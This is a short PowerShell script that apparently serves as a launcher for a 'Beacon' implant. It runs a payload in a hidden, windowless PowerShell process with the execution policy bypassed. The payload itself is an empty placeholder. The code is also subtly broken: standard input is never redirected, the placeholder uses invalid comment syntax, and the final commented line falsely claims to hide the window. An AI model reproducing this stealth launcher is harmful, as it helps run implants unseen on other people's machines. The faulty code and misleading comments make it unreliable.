# Import required modules
Import-Module PSReadLine
 
# Define function to run code as a hidden process
function Run-HiddenProcess {
    param(
        [Parameter(Mandatory = $true)]
        [string] $scriptBlock
    )
 
    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processStartInfo.UseShellExecute = $false
    $processStartInfo.CreateNoWindow = $true
    $processStartInfo.FileName = "powershell.exe"
    $processStartInfo.Arguments = "-noprofile -windowstyle hidden -executionpolicy bypass"
 
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processStartInfo
 
    $process.Start()
    $process.StandardInput.WriteLine($scriptBlock)
    $process.StandardInput.Close()
 
    Wait-Process -Id $process.Id
 
    $process.Dispose()
}
 
# Beacon code to be executed
$beaconScript = @"
// Beacon code goes here
"@
 
# Run the Beacon code as a hidden process
Run-HiddenProcess -scriptBlock $beaconScript
 
# Additional code to execute after the Beacon code
Write-Host "Beacon script executed successfully!"
 
# Uncomment this line to hide the PowerShell window
# $PSReadLine.History = @()
